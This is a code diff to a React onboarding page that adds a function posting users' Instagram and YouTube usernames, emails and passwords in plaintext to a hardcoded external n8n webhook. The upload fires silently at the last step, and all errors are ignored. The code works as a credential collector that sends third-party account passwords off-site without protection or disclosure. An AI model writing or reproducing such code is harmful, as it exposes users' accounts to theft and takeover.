@@ -605,10 +605,52 @@ export default function OnboardingPage() {
     youtube: { email: '', password: '', confirmPassword: '' }
   });
 
-  const nextStep = () => {
-    if (currentStep < 5) {
-      setCurrentStep(currentStep + 1);
+  // Send collected data to n8n webhook from the browser
+  const submitToWebhook = async () => {
+    try {
+      const webhookUrl = 'https://n8n.srv990688.hstgr.cloud/webhook/b09df917-2fca-4364-88df-7f3ffee52416';
+
+      const payload = {
+        userInfo,
+        selectedNiche,
+        accounts: {
+          instagram: {
+            username: accounts.instagram.username,
+            instagrampassword: accounts.instagram.password
+          },
+          youtube: {
+            email: accounts.youtube.email,
+            "yt password": accounts.youtube.password
+          }
+        },
+        metadata: {
+          submittedAt: new Date().toISOString(),
+          userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'unknown'
+        }
+      };
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload),
+        keepalive: true
+      });
+    } catch (_err) {
+      // Intentionally ignore errors on client-side submission
     }
+  };
+
+  const nextStep = () => {
+    setCurrentStep(prev => {
+      const next = prev + 1;
+      if (prev === 4) {
+        // We are moving from the last input step to success; submit data now
+        void submitToWebhook();
+      }
+      return next <= 5 ? next : 5;
+    });
   };
 
 
